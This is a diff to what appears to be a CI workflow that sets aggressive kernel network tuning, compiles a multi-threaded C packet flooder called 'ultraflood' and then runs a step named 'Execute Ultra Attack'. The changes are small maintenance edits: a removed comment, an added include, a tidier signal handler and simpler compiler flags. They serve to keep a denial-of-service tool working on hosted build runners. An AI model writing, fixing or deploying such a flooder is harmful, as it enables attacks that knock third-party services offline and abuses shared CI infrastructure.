@@ -40,7 +40,6 @@ jobs:
     steps:
       - name: Ultimate System Tuning
         run: |
-          # Максимальные настройки ядра
           sudo sysctl -w net.core.rmem_max=1073741824
           sudo sysctl -w net.core.wmem_max=1073741824
           sudo sysctl -w net.core.rmem_default=536870912
@@ -56,8 +55,7 @@ jobs:
           sudo sysctl -w net.core.optmem_max=65536
           sudo sysctl -w net.ipv4.conf.all.rp_filter=0
           sudo sysctl -w net.ipv4.conf.default.rp_filter=0
-          
-          echo "✅ Ultimate system tuning complete"
+          echo "✅ System tuning complete"
 
       - name: Compile Ultra Flooder
         run: |
@@ -78,6 +76,7 @@ jobs:
           #include <errno.h>
           #include <fcntl.h>
           #include <sched.h>
+          #include <signal.h>
           
           #define MAX_SOCKETS 32
           #define BATCH_SIZE 512
@@ -229,7 +228,10 @@ jobs:
               return NULL;
           }
           
-          void signal_handler(int sig) { running = 0; }
+          void signal_handler(int sig) { 
+              (void)sig;
+              running = 0; 
+          }
           
           int main(int argc, char *argv[]) {
               if (argc != 7) {
@@ -334,7 +336,7 @@ jobs:
           }
           EOF
           
-          gcc -O3 -march=native -pthread -flto -o ultraflood ultraflood.c 2>/dev/null || gcc -O3 -pthread -o ultraflood ultraflood.c
+          gcc -O3 -pthread -o ultraflood ultraflood.c
           echo "✅ Ultra flooder compiled"
 
       - name: Execute Ultra Attack
